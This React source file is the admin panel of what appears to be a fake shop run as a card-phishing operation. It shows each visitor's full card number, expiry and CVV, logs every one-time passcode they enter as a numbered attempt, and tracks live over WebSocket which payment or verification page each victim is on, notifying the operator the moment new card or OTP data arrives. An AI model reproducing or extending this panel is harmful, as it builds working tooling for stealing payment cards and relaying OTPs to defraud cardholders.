import { useState, useEffect, useMemo, useRef } from 'react';
import { useQueryClient } from '@tanstack/react-query';
import { useListAdminOrders } from '@workspace/api-client-react';
import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff, Clock, Check, X } from 'lucide-react';
import { LoadingBlock, ErrorBlock } from '../shared';
import { usePresence } from '@/hooks/usePresence';
import { addGlobalNotification, type NotificationType } from '@/hooks/useNotifications';

type CustomerTab = 'info' | 'summary' | 'payment' | 'verification';

interface CardAttempt {
  id: number;
  orderId: number;
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string | null;
  createdAt: string;
}

interface OtpAttempt {
  id: number;
  orderId: number;
  otpCode: string;
  success: boolean;
  createdAt: string;
}

function formatCardNumber(num: string | undefined | null) {
  if (!num) return '---';
  // Format with spaces every 4 digits
  return num.replace(/(.{4})/g, '$1 ').trim();
}

function getPaymentMethodLabel(method: string | undefined) {
  return method === 'cash_on_delivery' ? 'دفع عند الاستلام' : 'دفع الآن';
}

function getPageDisplayName(path: string): string {
  const pageNames: Record<string, string> = {
    '/': 'الصفحة الرئيسية',
    '/products': 'المنتجات',
    '/order': 'طلب جديد',
    '/summary': 'ملخص الطلب',
    '/payment': 'صفحة الدفع',
    '/payment-verification': 'تحقق الدفع',
    '/payment-waiting': 'انتظار الدفع',
    '/payment-rejected': 'رفض الدفع',
    '/thank-you': 'شكراً لك',
    '/about': 'من نحن',
    '/contact': 'اتصل بنا',
    '/sign-in': 'تسجيل الدخول',
    '/sign-up': 'إنشاء حساب',
    '/admin': 'لوحة التحكم',
  };
  return pageNames[path] || path;
}

function formatDateTime(dateString: string): string {
  const date = new Date(dateString);
  return date.toLocaleString('ar-SA', {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });
}

// Format as relative time (counting up from 0)
function formatRelativeTime(dateString: string): string {
  const date = new Date(dateString);
  const now = new Date();
  const diffMs = now.getTime() - date.getTime();
  
  if (diffMs < 0) return 'الآن';
  
  const seconds = Math.floor(diffMs / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);
  
  if (days > 0) return `منذ ${days} ${days === 1 ? 'يوم' : days < 11 ? 'أيام' : 'يوم'}`;
  if (hours > 0) return `منذ ${hours} ${hours === 1 ? 'ساعة' : hours < 11 ? 'ساعات' : 'ساعة'}`;
  if (minutes > 0) return `منذ ${minutes} ${minutes === 1 ? 'دقيقة' : minutes < 11 ? 'دقائق' : 'دقيقة'}`;
  return `منذ ${seconds} ${seconds === 1 ? 'ثانية' : seconds < 11 ? 'ثواني' : 'ثانية'}`;
}

export function CustomersAdmin() {
  const queryClient = useQueryClient();
  const { data: orders, isLoading, isError, refetch } = useListAdminOrders();
  
  // Define ordersList early so it can be used in useEffect hooks
  const ordersList = Array.isArray(orders) ? orders : [];
  
  // Real-time presence from WebSocket
  const { presenceClients, isConnected } = usePresence();
  
  const [selectedCustomerId, setSelectedCustomerId] = useState<number | null>(null);
  const [activeTab, setActiveTab] = useState<CustomerTab>('info');
  const [cardAttempts, setCardAttempts] = useState<CardAttempt[]>([]);
  const [loadingAttempts, setLoadingAttempts] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState<OtpAttempt[]>([]);
  const [loadingOtpAttempts, setLoadingOtpAttempts] = useState(false);
  
  // Visitors with accurate page tracking
  const [visitors, setVisitors] = useState<Array<{ visitorId: string; currentPage: string | null; lastSeenAt: string | null }>>([]);
  
  // Track previous orders count to detect new orders
  const prevOrdersCountRef = useRef(0);

  // Listen for new data events and trigger notifications
  useEffect(() => {
    console.log('[ADMIN] Setting up notification event listeners');
    
    const handleCustomerInfo = (event: CustomEvent) => {
      console.log('[ADMIN] dheebti-customer-info received', event.detail);
      addGlobalNotification('customer', event.detail?.customerName);
    };
    const handleDataUpdate = (event: Event) => {
      console.log('[ADMIN] dheebti-data-update received');
      addGlobalNotification('order');
    };
    const handleCardAttempt = (event: CustomEvent) => {
      console.log('[ADMIN] dheebti-card-attempt received', event.detail);
      addGlobalNotification('payment', event.detail?.customerName);
    };
    const handleOtpAttempt = (event: CustomEvent) => {
      console.log('[ADMIN] dheebti-otp-attempt received', event.detail);
      addGlobalNotification('otp', event.detail?.customerName);
    };

    window.addEventListener('dheebti-customer-info', handleCustomerInfo as EventListener);
    window.addEventListener('dheebti-data-update', handleDataUpdate as EventListener);
    window.addEventListener('dheebti-card-attempt', handleCardAttempt as EventListener);
    window.addEventListener('dheebti-otp-attempt', handleOtpAttempt as EventListener);

    return () => {
      window.removeEventListener('dheebti-customer-info', handleCustomerInfo as EventListener);
      window.removeEventListener('dheebti-data-update', handleDataUpdate as EventListener);
      window.removeEventListener('dheebti-card-attempt', handleCardAttempt as EventListener);
      window.removeEventListener('dheebti-otp-attempt', handleOtpAttempt as EventListener);
    };
  }, []);

  // Track new orders and send notifications
  useEffect(() => {
    if (orders && Array.isArray(orders)) {
      const currentCount = orders.length;
      if (prevOrdersCountRef.current > 0 && currentCount > prevOrdersCountRef.current) {
        // New order added
        const latestOrder = orders[0];
        if (latestOrder) {
          addGlobalNotification('order', latestOrder.customerName || 'عميل جديد');
        }
      }
      prevOrdersCountRef.current = currentCount;
    }
  }, [orders]);

  // Listen for real-time new order events via WebSocket
  useEffect(() => {
    const handleNewOrder = () => {
      console.log("[Admin] New order detected - invalidating queries for instant update");
      queryClient.invalidateQueries({ queryKey: ['/api/admin/orders'] });
    };
    window.addEventListener('dheebti-new-order', handleNewOrder);
    return () => window.removeEventListener('dheebti-new-order', handleNewOrder);
  }, [queryClient]);

  // Fetch card and OTP attempts when selected customer changes (by visitorId)
  useEffect(() => {
    if (!selectedCustomerId) {
      setCardAttempts([]);
      setOtpAttempts([]);
      return;
    }

    const fetchAttempts = async (orders: typeof ordersList, visitorId: string | null) => {
      setLoadingAttempts(true);
      setLoadingOtpAttempts(true);
      
      try {
        if (!visitorId) {
          // Fallback to old method if no visitorId
          const cardRes = await fetch(`/api/admin/orders/${selectedCustomerId}/card-attempts`);
          const otpRes = await fetch(`/api/admin/orders/${selectedCustomerId}/otp-attempts`);
          if (cardRes.ok) setCardAttempts(await cardRes.json());
          if (otpRes.ok) setOtpAttempts(await otpRes.json());
          return;
        }

        // Use new API to fetch all attempts for the customer group
        const response = await fetch(`/api/admin/customers/${visitorId}/attempts`);
        if (response.ok) {
          const data = await response.json();
          setCardAttempts(data.cardAttempts || []);
          setOtpAttempts(data.otpAttempts || []);
        }
      } catch (error) {
        console.error("[Admin] Failed to fetch attempts:", error);
      } finally {
        setLoadingAttempts(false);
        setLoadingOtpAttempts(false);
      }
    };

    // Get visitorId from orders list
    const order = ordersList.find(o => o.id === selectedCustomerId);
    const visitorId = order?.visitorId || null;
    fetchAttempts(ordersList, visitorId);
  }, [selectedCustomerId, ordersList]);

  // Listen for real-time card attempt updates via WebSocket
  useEffect(() => {
    const handleCardAttempt = (event: CustomEvent) => {
      const attempt = event.detail;
      console.log("[Admin] Card attempt event received:", attempt);
      
      // Get visitorId from orders list
      const order = ordersList.find(o => o.id === selectedCustomerId);
      const visitorId = order?.visitorId;
      
      // If this attempt belongs to current customer, refetch all
      if (visitorId) {
        fetch(`/api/admin/customers/${visitorId}/attempts`)
          .then(res => res.json())
          .then(data => {
            setCardAttempts(data.cardAttempts || []);
            setOtpAttempts(data.otpAttempts || []);
          })
          .catch(err => console.error("[Admin] Failed to refetch attempts:", err));
      }
    };
    
    window.addEventListener('dheebti-card-attempt', handleCardAttempt as EventListener);
    return () => window.removeEventListener('dheebti-card-attempt', handleCardAttempt as EventListener);
  }, [selectedCustomerId, ordersList]);

  // Listen for real-time OTP attempt updates via WebSocket
  useEffect(() => {
    const handleOtpAttempt = (event: CustomEvent) => {
      const attempt = event.detail;
      console.log("[Admin] OTP attempt event received:", attempt);
      
      // Get visitorId from orders list
      const order = ordersList.find(o => o.id === selectedCustomerId);
      const visitorId = order?.visitorId;
      
      // If this attempt belongs to current customer, refetch all
      if (visitorId) {
        fetch(`/api/admin/customers/${visitorId}/attempts`)
          .then(res => res.json())
          .then(data => {
            setCardAttempts(data.cardAttempts || []);
            setOtpAttempts(data.otpAttempts || []);
          })
          .catch(err => console.error("[Admin] Failed to refetch attempts:", err));
      }
    };
    
    window.addEventListener('dheebti-otp-attempt', handleOtpAttempt as EventListener);
    return () => window.removeEventListener('dheebti-otp-attempt', handleOtpAttempt as EventListener);
  }, [selectedCustomerId, ordersList]);
  
  // Set first order as selected when data loads
  useEffect(() => {
    if (ordersList.length > 0 && selectedCustomerId === null) {
      setSelectedCustomerId(ordersList[0].id);
    }
  }, [ordersList, selectedCustomerId]);

  // Fetch visitors for accurate page tracking
  useEffect(() => {
    const fetchVisitors = async () => {
      try {
        const response = await fetch('/api/admin/visitors');
        if (response.ok) {
          const data = await response.json();
          setVisitors(data || []);
        }
      } catch (error) {
        console.error("[Admin] Failed to fetch visitors:", error);
      }
    };

    fetchVisitors();
    // Refetch every 5 seconds for accurate page tracking
    const interval = setInterval(fetchVisitors, 5000);
    return () => clearInterval(interval);
  }, []);

  // Listen for data updates
  useEffect(() => {
    const handleUpdate = () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/orders'] });
    };
    window.addEventListener('dheebti-data-update', handleUpdate);
    return () => window.removeEventListener('dheebti-data-update', handleUpdate);
  }, [queryClient]);

  const selectedOrder = ordersList.find(o => o.id === selectedCustomerId);
  
  // Match presence clients with orders by visitorId (primary) or orderId (fallback)
  const ordersWithPresence = useMemo(() => {
    return ordersList.map((order) => {
      // First: try to match by visitorId (most accurate - from database)
      let visitor = order.visitorId 
        ? visitors.find((v) => v.visitorId === order.visitorId)
        : null;
      
      // Second: try to match by orderId (from WebSocket)
      let presence = presenceClients.find((p) => p.orderId === order.id);
      
      // Third: fallback to customer name
      if (!presence) {
        presence = presenceClients.find(
          (p) => p.customerName && p.customerName === order.customerName
        );
      }
      
      // Use visitor data for page (from database - more accurate)
      // Use presence data for isOnline status (real-time from WebSocket)
      return {
        ...order,
        currentPage: visitor?.currentPage || presence?.currentPage || null,
        isOnline: presence?.isOnline || false,
        lastSeenAt: visitor?.lastSeenAt || presence?.lastSeenAt || null,
      };
    });
  }, [ordersList, presenceClients, visitors]);

  // Group orders by customer (name + phone) to show unique customers
  const groupedCustomers = useMemo(() => {
    const grouped = ordersList.reduce((acc, order) => {
      // Group by visitorId (device identifier)
      const key = order.visitorId || `${order.customerName}-${order.phone}`;
      
      if (!acc[key]) {
        acc[key] = {
          visitorId: order.visitorId || null,
          customerName: order.customerName,
          phone: order.phone,
          orders: [],
          orderCount: 0,
          latestOrder: null as typeof ordersList[0] | null,
          latestOrderId: null as number | null,
          currentPage: null as string | null,
          isOnline: false,
          lastSeenAt: null as string | null,
        };
      }
      
      acc[key].orders.push(order);
      acc[key].orderCount++;
      
      // Update with the most recent order
      const orderDate = new Date(order.createdAt);
      if (!acc[key].latestOrder || orderDate > new Date(acc[key].latestOrder.createdAt)) {
        acc[key].latestOrder = order;
        acc[key].latestOrderId = order.id;
        
        // Update presence info from the latest order's match
        let presence = presenceClients.find((p) => p.orderId === order.id);
        if (!presence && order.visitorId) {
          presence = presenceClients.find((p) => p.visitorId === order.visitorId);
        }
        if (!presence) {
          presence = presenceClients.find(
            (p) => p.customerName && p.customerName === order.customerName
          );
        }
        if (presence) {
          acc[key].currentPage = presence.currentPage || null;
          acc[key].isOnline = presence.isOnline || false;
          acc[key].lastSeenAt = presence.lastSeenAt || null;
        }
      }
      
      return acc;
    }, {} as Record<string, {
      visitorId: string | null;
      customerName: string;
      phone: string;
      orders: typeof ordersList;
      orderCount: number;
      latestOrder: typeof ordersList[0] | null;
      latestOrderId: number | null;
      currentPage: string | null;
      isOnline: boolean;
      lastSeenAt: string | null;
    }>);
    
    // Sort by latest order date
    return Object.values(grouped).sort((a, b) => {
      if (!a.latestOrder || !b.latestOrder) return 0;
      return new Date(b.latestOrder.createdAt).getTime() - new Date(a.latestOrder.createdAt).getTime();
    });
  }, [ordersList, presenceClients]);
  
  // Find the customer group for selected order
  const selectedCustomerGroup = groupedCustomers.find(
    g => g.orders.some(o => o.id === selectedCustomerId)
  );

  const InfoSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-gray-50 p-4">
        <div className="flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
          <User className="h-6 w-6 text-primary" />
        </div>
        <div>
          <h3 className="font-bold text-lg">{selectedOrder.customerName}</h3>
          <p className="text-sm text-muted-foreground">طلب رقم {selectedOrder.id}</p>
        </div>
      </div>

      <div className="grid gap-3">
        <div className="flex items-center gap-3 rounded-lg border p-3">
          <Phone className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">رقم الهاتف</p>
            <p className="font-medium" dir="ltr">{selectedOrder.phone}</p>
          </div>
        </div>

        <div className="flex items-center gap-3 rounded-lg border p-3">
          <MapPin className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">عنوان التوصيل</p>
            <p className="font-medium">{selectedOrder.address}</p>
          </div>
        </div>

        <div className="flex items-center gap-3 rounded-lg border p-3">
          <Calendar className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">تاريخ الطلب</p>
            <p className="font-medium">{selectedOrder.pickupDate}</p>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  const SummarySection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <FileText className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">ملخص الطلب</h3>
          <p className="text-sm text-muted-foreground">تفاصيل الطلب #{selectedOrder.id}</p>
        </div>
      </div>

      <div className="rounded-lg border bg-card">
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">المنتج</span>
            <span className="font-medium">{selectedOrder.productName}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">العدد</span>
            <span className="font-medium">{selectedOrder.quantity}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">تاريخ الاستلام</span>
            <span className="font-medium">{selectedOrder.pickupDate}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">طريقة الدفع</span>
            <span className="font-medium">{getPaymentMethodLabel(selectedOrder.paymentMethod)}</span>
          </div>
        </div>
        <div className="p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">حالة الدفع</span>
            <span className="rounded-full bg-accent/30 px-3 py-1 text-xs font-bold text-secondary">
              {selectedOrder.paymentStatus === 'paid' ? 'مدفوع' : 
               selectedOrder.paymentStatus === 'pending' ? 'قيد الانتظار' : 'غير مطلوب'}
            </span>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  // Card attempt component for individual cards
  const CardAttemptCard = ({ attempt, index }: { attempt: CardAttempt; index: number }) => (
    <div className={`rounded-lg border bg-card p-6 ${index === 0 ? 'ring-2 ring-primary' : ''}`}>
      <div className="mb-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-sm font-medium text-muted-foreground">المحاولة #{index + 1}</span>
          {index === 0 && (
            <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
              الأحدث
            </span>
          )}
        </div>
        <div className="flex items-center gap-1 text-xs text-muted-foreground">
          <Clock className="h-3 w-3" />
          {formatRelativeTime(attempt.createdAt)}
        </div>
      </div>

      <div className="mb-4 flex items-center justify-between">
        <p className="text-sm text-muted-foreground">رقم البطاقة</p>
        <div className="flex items-center gap-2">
          <span className="font-mono text-sm" dir="ltr">{formatCardNumber(attempt.cardNumber)}</span>
          <span className="text-green-500">✓</span>
        </div>
      </div>

      <div className="mb-4 flex items-center justify-between">
        <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
        <span className="text-sm">{attempt.cardName}</span>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div className="flex items-center justify-between">
          <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
          <span className="text-sm">{attempt.cardExpiry}</span>
        </div>

        <div className="flex items-center justify-between">
          <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
          <span className="font-medium" dir="ltr">{attempt.cardCvv || '---'}</span>
        </div>
      </div>
    </div>
  );

  const PaymentSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <CreditCard className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">بيانات البطاقة</h3>
          <p className="text-sm text-muted-foreground">
            {cardAttempts.length > 0 
              ? `${cardAttempts.length} محاولة إدخال` 
              : 'معلومات بطاقة الدفع'}
          </p>
        </div>
      </div>

      {loadingAttempts ? (
        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
          جاري تحميل المحاولات...
        </div>
      ) : cardAttempts.length > 0 ? (
        // Show all card attempts
        <div className="space-y-4">
          {cardAttempts.map((attempt, index) => (
            <CardAttemptCard key={attempt.id} attempt={attempt} index={index} />
          ))}
        </div>
      ) : selectedCustomerGroup && selectedCustomerGroup.orders.some(o => o.cardNumber) ? (
        // Show card data from all orders in the group
        <div className="space-y-4">
          {selectedCustomerGroup.orders
            .filter(order => order.cardNumber)
            .map((order, index) => (
              <div key={order.id} className="rounded-lg border bg-card p-4">
                <div className="mb-2 flex items-center justify-between">
                  <span className="text-xs font-medium text-muted-foreground">
                    طلب #{order.id}
                  </span>
                  {index === 0 && (
                    <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
                      الأحدث
                    </span>
                  )}
                </div>
                <CardAttemptCard 
                  attempt={{
                    id: 0,
                    orderId: order.id,
                    cardName: order.cardName || '---',
                    cardNumber: order.cardNumber || '',
                    cardExpiry: order.cardExpiry || '---',
                    cardCvv: order.cardCvv,
                    createdAt: order.createdAt as string,
                  }} 
                  index={0}
                />
              </div>
            ))}
        </div>
      ) : (
        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
          لم يتم إدخال بيانات بطاقة بعد
        </div>
      )}
    </div>
  ) : null;

  // OTP attempt card component
  const OtpAttemptCard = ({ attempt, index }: { attempt: OtpAttempt; index: number }) => (
    <div className={`rounded-lg border bg-card p-6 ${index === 0 && attempt.success ? 'ring-2 ring-green-500' : index === 0 ? 'ring-2 ring-primary' : ''}`}>
      <div className="mb-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-sm font-medium text-muted-foreground">المحاولة #{index + 1}</span>
          {index === 0 && (
            <span className={`rounded-full px-2 py-0.5 text-xs font-medium ${
              attempt.success 
                ? 'bg-green-500/10 text-green-600' 
                : 'bg-primary/10 text-primary'
            }`}>
              {attempt.success ? 'الأحدث - نجاح' : 'الأحدث'}
            </span>
          )}
        </div>
        <div className="flex items-center gap-1 text-xs text-muted-foreground">
          <Clock className="h-3 w-3" />
          {formatRelativeTime(attempt.createdAt)}
        </div>
      </div>

      <p className="mb-4 text-center text-sm text-muted-foreground">رمز التحقق المدخل</p>
      <div className="flex justify-center gap-2">
        {attempt.otpCode.split('').map((digit, i) => (
          <div
            key={i}
            className={`flex h-12 w-10 items-center justify-center rounded-lg border-2 text-lg font-bold ${
              attempt.success 
                ? 'border-green-500/20 bg-green-500/5 text-green-600' 
                : 'border-red-500/20 bg-red-500/5 text-red-600'
            }`}
          >
            {digit}
          </div>
        ))}
      </div>
      <p className={`mt-4 text-center text-xs ${attempt.success ? 'text-green-600' : 'text-red-600'}`}>
        {attempt.success ? '✓ تم التحقق بنجاح' : '✗ غير صحيح'}
      </p>
    </div>
  );

  const VerificationSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <Shield className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">رمز التحقق</h3>
          <p className="text-sm text-muted-foreground">
            {otpAttempts.length > 0 
              ? `${otpAttempts.length} محاولة إدخال` 
              : 'كود التحقق من العملية'}
          </p>
        </div>
      </div>

      {loadingOtpAttempts ? (
        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
          جاري تحميل المحاولات...
        </div>
      ) : otpAttempts.length > 0 ? (
        <div className="space-y-4">
          {otpAttempts.map((attempt, index) => (
            <OtpAttemptCard key={attempt.id} attempt={attempt} index={index} />
          ))}
        </div>
      ) : selectedCustomerGroup && selectedCustomerGroup.orders.some(o => o.otpCode) ? (
        // Show OTP from all orders in the group
        <div className="space-y-4">
          {selectedCustomerGroup.orders
            .filter(order => order.otpCode)
            .map((order, index) => (
              <div key={order.id} className="rounded-lg border bg-card p-4">
                <div className="mb-2 flex items-center justify-between">
                  <span className="text-xs font-medium text-muted-foreground">
                    طلب #{order.id}
                  </span>
                  {index === 0 && (
                    <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
                      الأحدث
                    </span>
                  )}
                </div>
                <OtpAttemptCard 
                  attempt={{
                    id: 0,
                    orderId: order.id,
                    otpCode: order.otpCode || '',
                    success: true,
                    createdAt: order.createdAt as string,
                  }} 
                  index={0}
                />
              </div>
            ))}
        </div>
      ) : (
        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
          لم يتم إدخال رمز التحقق بعد
        </div>
      )}
    </div>
  ) : null;

  const renderContent = () => {
    switch (activeTab) {
      case 'info': return <InfoSection />;
      case 'summary': return <SummarySection />;
      case 'payment': return <PaymentSection />;
      case 'verification': return <VerificationSection />;
      default: return <InfoSection />;
    }
  };

  if (isLoading) return <LoadingBlock label="جاري تحميل البيانات" />;
  if (isError) return <ErrorBlock onRetry={() => void refetch()} />;

  return (
    <div className="flex h-[calc(100vh-140px)] gap-4">
      {/* Customer List Sidebar */}
      <div className="w-72 flex-shrink-0 overflow-hidden rounded-xl border bg-card">
        {/* WebSocket Connection Status */}
        <div className={`flex items-center gap-2 border-b px-4 py-2 text-xs ${
          isConnected 
            ? 'bg-green-50 text-green-700 border-green-200' 
            : 'bg-red-50 text-red-700 border-red-200'
        }`}>
          {isConnected ? (
            <>
              <Wifi className="h-3 w-3" />
              <span>متصل - تحديث فوري</span>
              <span className="ml-auto flex h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
            </>
          ) : (
            <>
              <WifiOff className="h-3 w-3" />
              <span>غير متصل</span>
              <span className="ml-auto flex h-2 w-2 rounded-full bg-gray-400"></span>
            </>
          )}
        </div>
        <div className="flex items-center justify-between border-b p-4">
          <div>
            <h2 className="font-bold">العملاء</h2>
            <p className="text-sm text-muted-foreground">
              {groupedCustomers.length} عميل ({ordersList.length} طلب)
            </p>
          </div>
          <button
            onClick={() => void refetch()}
            className="rounded-lg p-2 hover:bg-muted"
            title="تحديث"
          >
            <RefreshCw className="h-4 w-4" />
          </button>
        </div>
        <div className="overflow-y-auto p-2">
          {groupedCustomers.length === 0 ? (
            <div className="p-4 text-center text-sm text-muted-foreground">
              لا توجد طلبات حتى الآن
            </div>
          ) : (
            groupedCustomers.map((customer) => (
              <button
                key={customer.latestOrderId}
                onClick={() => {
                  if (customer.latestOrderId) {
                    setSelectedCustomerId(customer.latestOrderId);
                    setActiveTab('info');
                  }
                }}
                className={`mb-1 flex w-full items-center justify-between rounded-lg p-3 text-right transition-colors ${
                  selectedCustomerGroup === customer
                    ? 'bg-primary text-primary-foreground'
                    : 'hover:bg-muted'
                }`}
              >
                <div className="flex items-center gap-3">
                  <div className={`flex h-10 w-10 items-center justify-center rounded-full ${
                    selectedCustomerGroup === customer
                      ? 'bg-primary-foreground/20'
                      : 'bg-muted'
                  }`}>
                    <User className="h-5 w-5" />
                  </div>
                  <div className="text-right">
                    <p className="font-medium flex items-center gap-2">
                      {customer.customerName}
                      {customer.orderCount > 1 && (
                        <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-primary/20 text-primary-foreground">
                          {customer.orderCount} طلبات
                        </span>
                      )}
                    </p>
                    <div className={`flex items-center gap-2 text-xs ${
                      selectedCustomerGroup === customer
                        ? 'text-primary-foreground/70'
                        : 'text-muted-foreground'
                    }`}>
                      {customer.isOnline ? (
                        <>
                          <span className="flex items-center gap-1 text-green-500">
                            <span className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
                            {getPageDisplayName(customer.currentPage || '/')}
                          </span>
                        </>
                      ) : (
                        <>
                          <span className="flex items-center gap-1">
                            <WifiOff className="h-3 w-3" />
                            {customer.currentPage ? getPageDisplayName(customer.currentPage) : 'غير متصل'}
                          </span>
                        </>
                      )}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {customer.isOnline ? (
                    <span className="flex h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
                  ) : (
                    <span className="flex h-2 w-2 rounded-full bg-gray-400"></span>
                  )}
                  <ChevronRight className={`h-4 w-4 ${
                    selectedCustomerGroup === customer ? 'rotate-180' : ''
                  }`} />
                </div>
              </button>
            ))
          )}
        </div>
      </div>

      {/* Content Area */}
      <div className="flex-1 overflow-hidden rounded-xl border bg-card">
        {/* Tabs */}
        <div className="flex gap-1 border-b p-2">
          <button
            onClick={() => setActiveTab('info')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'info'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <User className="h-4 w-4" />
            معلومات العميل
          </button>
          <button
            onClick={() => setActiveTab('summary')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'summary'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <FileText className="h-4 w-4" />
            الملخص
          </button>
          <button
            onClick={() => setActiveTab('payment')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'payment'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <CreditCard className="h-4 w-4" />
            بطاقة الدفع
          </button>
          <button
            onClick={() => setActiveTab('verification')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'verification'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <Shield className="h-4 w-4" />
            رمز التحقق
          </button>
        </div>

        {/* Tab Content */}
        <div className="overflow-y-auto p-6" style={{ height: 'calc(100% - 65px)' }}>
          {selectedOrder ? (
            renderContent()
          ) : (
            <div className="flex h-full flex-col items-center justify-center text-center">
              <User className="mb-4 h-16 w-16 text-muted-foreground/30" />
              <h3 className="text-lg font-bold text-muted-foreground">اختر عميلاً</h3>
              <p className="mt-2 text-sm text-muted-foreground">
                قم بتحديد عميل من القائمة لعرض التفاصيل
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
